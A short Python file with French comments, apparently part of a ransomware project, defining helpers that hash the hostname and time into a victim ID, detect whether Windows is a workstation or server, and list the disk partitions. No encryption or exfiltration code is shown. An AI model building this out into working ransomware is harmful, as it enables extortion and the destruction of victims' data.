import socket
from datetime import datetime
import hashlib
import sys
import psutil

def generate_ID_hash_ransomware():
    """
    Cette fonction récupère l'heure courante et le nom de l'hote pour pouvoir générer et retourner une clé unique qui sera l'identifiant du ransomware de la victime
    :return: str, la clé unique générée
    """
    # Concatène le nom de l'hôte et l'heure courante
    key = socket.gethostname() + str(datetime.now().time())
    # Utitilise une fonction de hash (SHA256) sur la concaténation des deux, ce qui donne une clé unique
    new_key = str(hashlib.sha256(key.encode()).hexdigest())

    return new_key

def get_type_system():
    """
    Cette fonction récupère le type de système. La méthode getwindowsversion retournera un int de 1 à 3.
    Si il est a 1, c'est un Workstation, si il est à 2, c'est un autre, si il est a 3, c'est un Server.
    :return: str, le type de système
    """

    num_sys = sys.getwindowsversion().product_type
    type_sys = ''

    if num_sys == 1:
        type_sys = 'WORKSTATION'
    elif num_sys == 2:
        type_sys = 'OTHER'
    elif num_sys == 3:
        type_sys = 'SERVER'

    return type_sys

def get_disk():
    """
    Cette fonction utilise la méthode disk_partitions pour récupérer un objet, sur lequel on utilisera la méthode device,
    ce qui nous retournera à chaque fois les disques. Ceux-ci sont transformés en str et ajoutés à une liste.
    :return: list, contient les disques
    """
    disks = []
    for partition in psutil.disk_partitions():
        disks.append(str(partition.device))
    return disks